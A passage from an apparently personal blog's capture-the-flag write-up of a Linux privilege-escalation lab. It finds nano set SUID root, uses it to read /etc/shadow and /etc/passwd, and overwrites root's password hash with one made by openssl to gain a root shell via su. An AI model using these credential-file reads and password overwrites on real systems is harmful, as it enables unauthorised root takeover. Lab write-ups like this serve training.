+</span></span><span class=line><span class=cl>     <span class=m>1886</span>     <span class=m>59</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>59640</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core18/2785/usr/bin/passwd
+</span></span><span class=line><span class=cl>     <span class=m>1977</span>    <span class=m>146</span> -rwsr-xr-x   <span class=m>1</span> root     root              <span class=m>149080</span> Apr  <span class=m>4</span>  <span class=m>2023</span> /snap/core18/2785/usr/bin/sudo
+</span></span><span class=line><span class=cl>     <span class=m>2065</span>     <span class=m>42</span> -rwsr-xr--   <span class=m>1</span> root     systemd-resolve    <span class=m>42992</span> Oct <span class=m>25</span>  <span class=m>2022</span> /snap/core18/2785/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class=line><span class=cl>     <span class=m>2375</span>    <span class=m>427</span> -rwsr-xr-x   <span class=m>1</span> root     root              <span class=m>436552</span> Mar <span class=m>30</span>  <span class=m>2022</span> /snap/core18/2785/usr/lib/openssh/ssh-keysign
+</span></span><span class=line><span class=cl>       <span class=m>56</span>     <span class=m>43</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>43088</span> Sep <span class=m>16</span>  <span class=m>2020</span> /snap/core18/2751/bin/mount
+</span></span><span class=line><span class=cl>       <span class=m>65</span>     <span class=m>63</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>64424</span> Jun <span class=m>28</span>  <span class=m>2019</span> /snap/core18/2751/bin/ping
+</span></span><span class=line><span class=cl>       <span class=m>81</span>     <span class=m>44</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>44664</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core18/2751/bin/su
+</span></span><span class=line><span class=cl>       <span class=m>99</span>     <span class=m>27</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>26696</span> Sep <span class=m>16</span>  <span class=m>2020</span> /snap/core18/2751/bin/umount
+</span></span><span class=line><span class=cl>     <span class=m>1728</span>     <span class=m>75</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>76496</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core18/2751/usr/bin/chfn
+</span></span><span class=line><span class=cl>     <span class=m>1730</span>     <span class=m>44</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>44528</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core18/2751/usr/bin/chsh
+</span></span><span class=line><span class=cl>     <span class=m>1783</span>     <span class=m>75</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>75824</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core18/2751/usr/bin/gpasswd
+</span></span><span class=line><span class=cl>     <span class=m>1847</span>     <span class=m>40</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>40344</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core18/2751/usr/bin/newgrp
+</span></span><span class=line><span class=cl>     <span class=m>1860</span>     <span class=m>59</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>59640</span> Nov <span class=m>29</span>  <span class=m>2022</span> /snap/core18/2751/usr/bin/passwd
+</span></span><span class=line><span class=cl>     <span class=m>1951</span>    <span class=m>146</span> -rwsr-xr-x   <span class=m>1</span> root     root              <span class=m>149080</span> Apr  <span class=m>4</span>  <span class=m>2023</span> /snap/core18/2751/usr/bin/sudo
+</span></span><span class=line><span class=cl>     <span class=m>2039</span>     <span class=m>42</span> -rwsr-xr--   <span class=m>1</span> root     systemd-resolve    <span class=m>42992</span> Oct <span class=m>25</span>  <span class=m>2022</span> /snap/core18/2751/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class=line><span class=cl>     <span class=m>2349</span>    <span class=m>427</span> -rwsr-xr-x   <span class=m>1</span> root     root              <span class=m>436552</span> Mar <span class=m>30</span>  <span class=m>2022</span> /snap/core18/2751/usr/lib/openssh/ssh-keysign
+</span></span><span class=line><span class=cl>    <span class=m>10732</span>     <span class=m>52</span> -rwsr-xr--   <span class=m>1</span> root     messagebus         <span class=m>51344</span> Oct <span class=m>25</span>  <span class=m>2022</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class=line><span class=cl>    <span class=m>25779</span>    <span class=m>464</span> -rwsr-xr-x   <span class=m>1</span> root     root              <span class=m>473576</span> Apr  <span class=m>3</span>  <span class=m>2023</span> /usr/lib/openssh/ssh-keysign
+</span></span><span class=line><span class=cl>    <span class=m>13935</span>     <span class=m>24</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>22840</span> Feb <span class=m>21</span>  <span class=m>2022</span> /usr/lib/policykit-1/polkit-agent-helper-1
+</span></span><span class=line><span class=cl>     <span class=m>7479</span>     <span class=m>16</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>14488</span> Jul  <span class=m>8</span>  <span class=m>2019</span> /usr/lib/eject/dmcrypt-get-device
+</span></span><span class=line><span class=cl>     <span class=m>7044</span>    <span class=m>144</span> -rwsr-xr-x   <span class=m>1</span> root     root              <span class=m>146888</span> May <span class=m>29</span>  <span class=m>2023</span> /usr/lib/snapd/snap-confine
+</span></span><span class=line><span class=cl>     <span class=m>9161</span>     <span class=m>84</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>85064</span> Nov <span class=m>29</span>  <span class=m>2022</span> /usr/bin/chfn
+</span></span><span class=line><span class=cl>    <span class=m>13933</span>     <span class=m>32</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>31032</span> Feb <span class=m>21</span>  <span class=m>2022</span> /usr/bin/pkexec
+</span></span><span class=line><span class=cl>    <span class=m>16077</span>    <span class=m>164</span> -rwsr-xr-x   <span class=m>1</span> root     root              <span class=m>166056</span> Apr  <span class=m>4</span>  <span class=m>2023</span> /usr/bin/sudo
+</span></span><span class=line><span class=cl>     <span class=m>5576</span>     <span class=m>40</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>39144</span> May <span class=m>30</span>  <span class=m>2023</span> /usr/bin/umount
+</span></span><span class=line><span class=cl>     <span class=m>9166</span>     <span class=m>68</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>68208</span> Nov <span class=m>29</span>  <span class=m>2022</span> /usr/bin/passwd
+</span></span><span class=line><span class=cl>     <span class=m>9165</span>     <span class=m>88</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>88464</span> Nov <span class=m>29</span>  <span class=m>2022</span> /usr/bin/gpasswd
+</span></span><span class=line><span class=cl>     <span class=m>3189</span>     <span class=m>44</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>44784</span> Nov <span class=m>29</span>  <span class=m>2022</span> /usr/bin/newgrp
+</span></span><span class=line><span class=cl>     <span class=m>9163</span>     <span class=m>52</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>53040</span> Nov <span class=m>29</span>  <span class=m>2022</span> /usr/bin/chsh
+</span></span><span class=line><span class=cl>     <span class=m>2136</span>    <span class=m>316</span> -rwsr-xr-x   <span class=m>1</span> root     root              <span class=m>320136</span> Apr <span class=m>10</span>  <span class=m>2020</span> /usr/bin/nano
+</span></span><span class=line><span class=cl>    <span class=m>10845</span>     <span class=m>68</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>67816</span> May <span class=m>30</span>  <span class=m>2023</span> /usr/bin/su
+</span></span><span class=line><span class=cl>     <span class=m>2028</span>     <span class=m>40</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>39144</span> Mar  <span class=m>7</span>  <span class=m>2020</span> /usr/bin/fusermount
+</span></span><span class=line><span class=cl>     <span class=m>1571</span>    <span class=m>316</span> -rwsr-x---   <span class=m>1</span> root     zeamkish          <span class=m>320160</span> Feb <span class=m>18</span>  <span class=m>2020</span> /usr/bin/find
+</span></span><span class=line><span class=cl>     <span class=m>2166</span>     <span class=m>56</span> -rwsr-sr-x   <span class=m>1</span> daemon   daemon             <span class=m>55560</span> Nov <span class=m>12</span>  <span class=m>2018</span> /usr/bin/at
+</span></span><span class=line><span class=cl>     <span class=m>5210</span>     <span class=m>56</span> -rwsr-xr-x   <span class=m>1</span> root     root               <span class=m>55528</span> May <span class=m>30</span>  <span class=m>2023</span> /usr/bin/mount
+</span></span></code></pre></td></tr></table></div></div><p>We can see that we can run nano with root privileges.</p><p>I tried to gain a root shell but failed, so I just went and read the file of the shadow and password:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
+</span><span class=lnt>90
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/usr/bin/nano /etc/shadow
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>root:&lt;redacted&gt;:19519:0:99999:7:::
+</span></span><span class=line><span class=cl>daemon:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>bin:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>sys:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>sync:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>games:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>man:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>lp:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>mail:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>news:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>uucp:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>proxy:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>www-data:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>backup:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>list:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>irc:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>gnats:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>nobody:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>systemd-network:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>systemd-resolve:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>systemd-timesync:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>messagebus:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>syslog:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>_apt:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>tss:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>uuidd:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>tcpdump:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>sshd:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>landscape:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>pollinate:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>ec2-instance-connect:!:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>systemd-coredump:!!:19502::::::
+</span></span><span class=line><span class=cl>ubuntu:&lt;redacted&gt;:19519:0:99999:7:::
+</span></span><span class=line><span class=cl>lxd:!:19502::::::
+</span></span><span class=line><span class=cl>mysql:!:19502:0:99999:7:::
+</span></span><span class=line><span class=cl>zeamkish:&lt;redacted&gt;:19516:0:99999:7:::
+</span></span><span class=line><span class=cl>ftp:*:19519:0:99999:7:::
+</span></span><span class=line><span class=cl>bind:*:19523:0:99999:7:::
+</span></span><span class=line><span class=cl>Debian-snmp:!:19523:0:99999:7:::
+</span></span><span class=line><span class=cl>redis:*:19523:0:99999:7:::
+</span></span><span class=line><span class=cl>mosquitto:*:19523:0:99999:7:::
+</span></span><span class=line><span class=cl>fwupd-refresh:*:19544:0:99999:7:::
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/usr/bin/nano /etc/passwd
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
+</span></span><span class=line><span class=cl>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class=line><span class=cl>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>gnats:x:41:41:Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+</span></span><span class=line><span class=cl>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>pollinate:x:111:1::/var/cache/pollinate:/bin/false
+</span></span><span class=line><span class=cl>ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+</span></span><span class=line><span class=cl>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+</span></span><span class=line><span class=cl>mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span class=line><span class=cl>zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>bind:x:115:122::/var/cache/bind:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>Debian-snmp:x:116:123::/var/lib/snmp:/bin/false
+</span></span><span class=line><span class=cl>redis:x:117:124::/var/lib/redis:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+</span></span></code></pre></td></tr></table></div></div><p>/usr/bin/nano /etc/shadow</p><p>I wasn’t able to crack the password, but maybe can just change it.</p><p>I generated the password using</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>openssl passwd -6 -salt xyz cat
+</span></span></code></pre></td></tr></table></div></div><p>And then I replaced the root one:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root:<span class=nv>$6$xyz$SY6bQy3sDajZ0bHnCG35i3R6ykQksyM6FsKDhwWIi6PAr1tmNG2IIkuMaKq</span>.eZtztGCTScNGLxe9Fdzn4CBMK1:7:::
+</span></span><span class=line><span class=cl>daemon:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>bin:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>sys:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>sync:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>games:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>man:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>lp:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>mail:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>news:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>uucp:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>proxy:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>www-data:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>backup:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>list:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>irc:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>gnats:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>nobody:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>systemd-network:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>systemd-resolve:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>systemd-timesync:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>messagebus:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>syslog:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>_apt:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>tss:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>uuidd:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>tcpdump:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>sshd:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>landscape:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>pollinate:*:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>ec2-instance-connect:!:18561:0:99999:7:::
+</span></span><span class=line><span class=cl>systemd-coredump:!!:19502::::::
+</span></span><span class=line><span class=cl>ubuntu:&lt;redacted&gt;:19519:0:99999:7:::
+</span></span><span class=line><span class=cl>lxd:!:19502::::::
+</span></span><span class=line><span class=cl>mysql:!:19502:0:99999:7:::
+</span></span><span class=line><span class=cl>zeamkish:&lt;redacted&gt;.:19516:0:99999:7:::
+</span></span><span class=line><span class=cl>ftp:*:19519:0:99999:7:::
+</span></span><span class=line><span class=cl>bind:*:19523:0:99999:7:::
+</span></span><span class=line><span class=cl>Debian-snmp:!:19523:0:99999:7:::
+</span></span><span class=line><span class=cl>redis:*:19523:0:99999:7:::
+</span></span><span class=line><span class=cl>mosquitto:*:19523:0:99999:7:::
+</span></span><span class=line><span class=cl>fwupd-refresh:*:19544:0:99999:7:::
+</span></span></code></pre></td></tr></table></div></div><p>So now I can su as the root and get the flag in the root directory.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>su root
+</span></span><span class=line><span class=cl>Password: cat
+</span></span><span class=line><span class=cl>root@ip-10-10-108-101:/home/zeamkish#
+</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/linux/>Linux</a>
+<a href=/tags/privilege-escalation/>Privilege Escalation</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/brooklyn99-writeup-thm/><div class=article-image><img src=https://raw.githubusercontent.com/SimoneFelici/Brooklyn99-writeup-THM/main/13bdc32e-cf3b-45e6-bbd0-66ba5d3eb15b_Export-b06d992f-14fb-47d3-b043-361b15c6baaf/Brooklyn99%2006e08d0fc2c34cefb989749df758fcb4/Untitled.png loading=lazy data-key data-hash=https://raw.githubusercontent.com/SimoneFelici/Brooklyn99-writeup-THM/main/13bdc32e-cf3b-45e6-bbd0-66ba5d3eb15b_Export-b06d992f-14fb-47d3-b043-361b15c6baaf/Brooklyn99%2006e08d0fc2c34cefb989749df758fcb4/Untitled.png></div><div class=article-details><h2 class=article-title>Brooklyn99 Writeup THM</h2></div></a></article><article class=has-image><a href=/p/startup-writeup-thm/><div class=article-image><img src=https://raw.githubusercontent.com/Blueaulo/Startup-writeup-THM/main/91426f10-815e-4dce-8275-a7e4a86904b0_Export-603ed8d9-2b1a-49ce-8213-7061cce6ff07/Startup%2009519d3a5bfc4be5bd4c3ca84ece9361/Untitled.png loading=lazy data-key data-hash=https://raw.githubusercontent.com/Blueaulo/Startup-writeup-THM/main/91426f10-815e-4dce-8275-a7e4a86904b0_Export-603ed8d9-2b1a-49ce-8213-7061cce6ff07/Startup%2009519d3a5bfc4be5bd4c3ca84ece9361/Untitled.png></div><div class=article-details><h2 class=article-title>Startup Writeup THM</h2></div></a></article><article class=has-image><a href=/p/overpass-writeup-thm/><div class=article-image><img src=https://raw.githubusercontent.com/Blueaulo/Overpass-writeup-THM/main/f08d4045-89e3-45d5-9ed3-0f650f39cb59_Export-a6534518-0a1b-40b8-b980-4ff782785aa3/Overpass%205b2344c2eb5141888e86ae3e2746ed53/Untitled.png loading=lazy data-key data-hash=https://raw.githubusercontent.com/Blueaulo/Overpass-writeup-THM/main/f08d4045-89e3-45d5-9ed3-0f650f39cb59_Export-a6534518-0a1b-40b8-b980-4ff782785aa3/Overpass%205b2344c2eb5141888e86ae3e2746ed53/Untitled.png></div><div class=article-details><h2 class=article-title>Overpass Writeup THM</h2></div></a></article><article class=has-image><a href=/p/skynet-writeup-thm/><div class=article-image><img src=https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled.png loading=lazy data-key data-hash=https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled.png></div><div class=article-details><h2 class=article-title>Skynet Writeup THM</h2></div></a></article><article class=has-image><a href=/p/ignite-writeup-thm/><div class=article-image><img src="https://images.unsplash.com/photo-1546182208-1e70985e2bf3?q=80&amp;w=2592&amp;auto=format&amp;fit=crop&amp;ixlib=rb-4.0.3&amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D" loading=lazy data-key data-hash="https://images.unsplash.com/photo-1546182208-1e70985e2bf3?q=80&amp;w=2592&amp;auto=format&amp;fit=crop&amp;ixlib=rb-4.0.3&amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"></div><div class=article-details><h2 class=article-title>Ignite Writeup THM</h2></div></a></article></div></div></aside><script src=https://utteranc.es/client.js repo=SimoneFelici/simonefelici.github.io issue-term=pathname label=💬 crossorigin=anonymous async></script><style>.utterances{max-width:unset}</style><script>let utterancesLoaded=!1;function setUtterancesTheme(e){let t=document.querySelector(".utterances iframe");t&&t.contentWindow.postMessage({type:"set-theme",theme:`github-${e}`},"https://utteranc.es")}addEventListener("message",e=>{if(e.origin!=="https://utteranc.es")return;utterancesLoaded=!0,setUtterancesTheme(document.documentElement.dataset.scheme)}),window.addEventListener("onColorSchemeChange",e=>{if(!utterancesLoaded)return;setUtterancesTheme(e.detail)})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2025 0000FF</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
